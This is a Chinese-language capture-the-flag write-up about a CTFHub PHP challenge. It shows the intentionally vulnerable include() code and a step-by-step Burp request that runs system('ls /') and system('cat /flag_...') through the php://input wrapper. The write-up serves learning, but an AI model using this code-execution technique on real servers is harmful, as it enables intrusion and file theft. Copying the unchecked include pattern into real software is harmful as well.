
---
layout: post
title: "CTFHub Writeup-php://input"
date: 2026-09-16
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - php://input 

## 题目类型

WEB

## 题目描述

打开题目，点开链接后，页面显示一串代码：

<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
<a href="phpinfo.php">phpinfo</a>

代码下面有两行文字：

i don't have shell, how to get flag?
phpinfo

点击phpinfo，会进入此题的phpinfo()探针页面

## 解题过程

访问靶场，页面回显 PHP 源码，核心代码为

if ( substr($_GET["file"], 0, 6) === "php://" ) {

    include($_GET["file"]);
    
}
代码只允许 file 参数以 php:// 开头

由于没有物理木马文件，且 php://input 伪协议专门用于读取 POST 请求体，因此我们必须构造 POST 请求

开启 Burp 拦截，用内置浏览器访问靶场，抓到 GET / HTTP/1.1 请求

将请求发送到 Repeater 模块

修改请求行：POST /?file=php://input HTTP/1.1

修改请求头：添加 Content-Type: application/x-www-form-urlencoded

空一行，在请求体写入 PHP 代码：<?php system('ls /'); ?>

重点：计算请求体的长度，<?php system('ls /'); ?> 是 24 字节，因此将 Content-Length 改为 24

点击 Send，右下角 Response 成功回显根目录列表，发现目标文件 flag_9238

修改请求体为：<?php system('cat /flag_9238'); ?>

重新计算长度：<?php system('cat /flag_9238'); ?> 是 34 字节，将 Content-Length 改为 34

再次点击 Send，右下角成功回显 Flag

## 笔记

这道题主要学习了:

1、php://input 伪协议的利用场景与原理

理解了 php://input 是一个可以读取 POST 请求体原始数据的伪协议。

当靶场只允许 file 参数以 php:// 开头，且没有物理木马文件时，我们就必须构造 POST 请求，把 PHP 代码放在 Body 里，让 include 去包含它并执行。
 
2、Burp Suite 手工构造 POST 请求的严谨性

深刻体会到了 HTTP 协议中 Content-Length 的重要性。

它必须严格等于请求体的字节数。一旦代码改动（比如 ls / 换成 cat /flag_xxx），就必须重新计算长度，否则服务器读取的 PHP 代码就会残缺，导致页面报错或白屏

